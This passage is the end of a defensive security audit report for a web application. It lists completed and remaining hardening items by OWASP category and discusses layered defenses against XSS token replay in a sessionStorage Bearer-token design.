|---|---|---|---|
| 1 | Nonce-based CSP (`'strict-dynamic'`) + HSTS + X-Frame-Options + X-Content-Type-Options | A05 | ✅ Done |
| 2 | `devErrorsEnabled="false"` + X-Powered-By removed | A05 | ✅ Done |
| 3 | CSRF Origin verification on session-token (POST) | A07 | ✅ Done |
| 4 | Token encryption (AES-256-GCM) + HMAC signing | A02 | ✅ Done |
| 5 | Zero-downtime secret rotation support | A02 | ✅ Done |
| 6 | 15-min token TTL + 10-min silent refresh | A04 | ✅ Done |
| 7 | Deny-by-default middleware (Bearer required) | A01 | ✅ Done |
| 8 | Rate limiting on session-token (10/min) | A07 | ✅ Done |
| 9 | Production guards (DEV_SESSION_USER_ID, ENABLE_DEV_BYPASS) | A04 | ✅ Done |
| 10 | Dev route blocking in production middleware | A04, A07 | ✅ Done |
| 11 | Fetch interceptor frozen (`writable: false, configurable: false`) | A08 | ✅ Done |
| 12 | Structured security event logging (6 event types) | A09 | ✅ Done |
| 13 | SSRF guard on ADF endpoint with allowlist | A10 | ✅ Done |
| 14 | Parameterized SQL + interpolation guard | A03 | ✅ Done |
| 15 | Prototype pollution rejection | A03 | ✅ Done |
| 16 | Runtime `SQL_ENCRYPT=false` rejection in production | A02 | ✅ Done |
| 17 | THEME_INIT_SCRIPT security comment in layout.tsx | A08 | ✅ Done |
| 18 | `x-request-id` sanitization (shared utility, control char stripping) | A03 | ✅ Done |
| 19 | Application Insights integration (security event forwarding) | A09 | ✅ Done |
| 20 | CSP hardened: `object-src 'none'`, `worker-src 'self'`, `child-src 'self'`, `manifest-src 'self'` | A05 | ✅ Done |
| 21 | `style-src-elem` nonce-gated (blocks CSS injection via `<style>` elements) | A05 | ✅ Done |
| 22 | ESLint `react/no-danger: error` prevents future `dangerouslySetInnerHTML` regressions | A08 | ✅ Done |

### Remaining Action Items (Prioritized)

| Priority | Issue | OWASP | Effort | Impact |
|---|---|---|---|---|
| ~~P1~~ | ~~Migrate CSP from `'unsafe-inline'` to nonce-based~~ | A05 | ~~Medium~~ | ✅ **Done** — nonce + `'strict-dynamic'` in middleware |
| ~~P1~~ | ~~Add runtime `SQL_ENCRYPT=true` guard for production~~ | A02 | ~~Trivial~~ | ✅ **Done** — `assertProductionEncryption()` in `lib/db/pool.ts` |
| ~~P1~~ | ~~Freeze fetch interceptor (writable: false, configurable: false)~~ | A08 | ~~Low~~ | ✅ **Done** — descriptor-check guard pattern prevents React lifecycle breakage |
| **P1** | Change `.env.production` `SQL_ENCRYPT=false` to `SQL_ENCRYPT=true` | A02 | Trivial | Prevents startup failures if App Service override missing |
| **P1** | Fix `verifyOrigin()` permissive fallback in staging | A07 | Low | Closes CSRF in non-prod deployments |
| ~~P1~~ | ~~Integrate Application Insights for security events~~ | A09 | ~~Medium~~ | ✅ **Done** — `lib/telemetry/app-insights.ts` + `instrumentation.ts` |
| **P2** | Add automated API route coverage tests | A01 | Medium | Catches missing auth guards in CI |
| **P2** | Implement distributed rate limiting (Redis/APIM) | A05 | Medium | Prevents multi-instance bypass |
| **P2** | Add `npm audit` to CI pipeline | A06 | Trivial | Catches known CVEs before deploy |
| **P2** | Enforce `npm ci --ignore-scripts` | A08 | Trivial | Blocks supply-chain postinstall attacks |
| ~~P2~~ | ~~Sanitize `x-request-id` for control characters~~ | A03 | ~~Trivial~~ | ✅ **Done** — shared `lib/api/request-id.ts` |
| **P2** | Add per-user throttling on token endpoint | A07 | Low | Limits token farming per account |
| **P3** | Implement token revocation mechanism | A04 | Medium | Immediate lockout capability |
| **P3** | Add re-auth challenge for destructive admin ops | A04 | Medium | Limits stolen token damage |
| **P3** | Derive HMAC key with separate domain separator | A02 | Low | Key independence defense-in-depth |
| **P3** | Add SBOM generation to release pipeline | A06 | Trivial | Compliance traceability |
| **P3** | Payload size limits on numerator ingestion | A03 | Trivial | Prevents memory exhaustion |
| **P3** | Disable redirect-following on ADF client | A10 | Trivial | Prevents redirect-based SSRF |

---

## Key Architectural Observation

The **sessionStorage + Bearer token** architecture provides a strong security profile when combined with the implemented controls:

| Property | sessionStorage (Bearer) | httpOnly Cookie |
|---|---|---|
| XSS token theft | ⚠️ Token readable by JS | ✅ Token hidden from JS |
| CSRF attacks | ✅ Immune (not auto-sent) | ⚠️ Requires SameSite + CSRF tokens |
| WAF/proxy interference | ✅ No cookie conflicts | ❌ Problematic with Azure WAF |
| Token encryption | ✅ AES-256-GCM (opaque blob) | N/A (server-side) |
| Session scope | Tab-only (auto-clears) | Cross-tab persistent |
| Replay window | 15 minutes (short TTL) | Configurable |

**The primary residual risk is XSS → token replay.** The layered defenses are:
1. **Nonce-based CSP** (`script-src 'nonce-...' 'strict-dynamic'`) blocks injected inline scripts entirely (strongest layer)
2. **CSP** (`connect-src 'self'`) blocks exfiltration to external origins (critical — the authoritative exfiltration-prevention control)
3. **CSP** (`object-src 'none'`, `worker-src 'self'`) closes plugin/Service Worker attack vectors
4. **CSP** (`style-src-elem 'nonce-...'`) blocks CSS injection via `<style>` element injection
5. **Frozen fetch interceptor** (`writable: false, configurable: false`) prevents XSS/supply-chain from replacing the interceptor to exfiltrate tokens
6. **ESLint `react/no-danger: error`** prevents future `dangerouslySetInnerHTML` regressions at lint time
7. **15-minute TTL** limits the replay window
8. **Server-side role re-verification** ensures stale claims don't grant extra access
9. **Encrypted payload** prevents claim inspection (attacker can replay but can't target specific high-privilege tokens)

**Recommended next steps (in priority order):**
1. ~~Freeze the fetch interceptor (`writable: false, configurable: false`)~~ ✅ **Done**
2. Change `.env.production` default to `SQL_ENCRYPT=true`
3. ~~Integrate Application Insights for security event alerting~~ ✅ **Done**
4. ~~Sanitize `x-request-id` in both middleware.ts and [...nextauth]/route.ts~~ ✅ **Done**
5. Configure Azure Monitor alert rules on Application Insights custom events (see A09 §2)

---

*End of audit report.*
